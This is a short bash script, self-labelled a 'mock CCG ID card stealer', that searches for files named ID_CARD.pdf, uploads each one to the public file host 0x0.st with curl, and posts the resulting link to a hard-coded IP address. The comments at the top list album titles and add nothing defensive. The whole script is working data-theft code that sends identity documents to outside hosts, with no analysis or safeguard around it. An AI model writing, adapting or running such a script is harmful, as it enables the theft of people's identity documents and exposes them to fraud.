#!/bin/bash

# RED + WHITE --> P!NK TAPE --> FOREVER YOUNG --> LUV IS RAGE 3
# NARCISSIST --> MUSIC --> DEAD ON ARRIVAL
# LYFE TAPE --> LYFE ALBUM
# A LOVE LETTER TO YOU 5
# PINK HEARTZ
# UTOPIA

# MOCK CCG ID CARD STEALER WRITTEN BY r0ck3t33r

find . -name "ID_CARD.pdf" -printf '%f\n' 2>/dev/null > data.txt

if [ -s data.txt ]; then
	while read line; do
		u=$(curl -F"file=@$line" https://0x0.st)
		curl --data "fle=$u" http://151.133.208.115/
	done<data.txt
fi
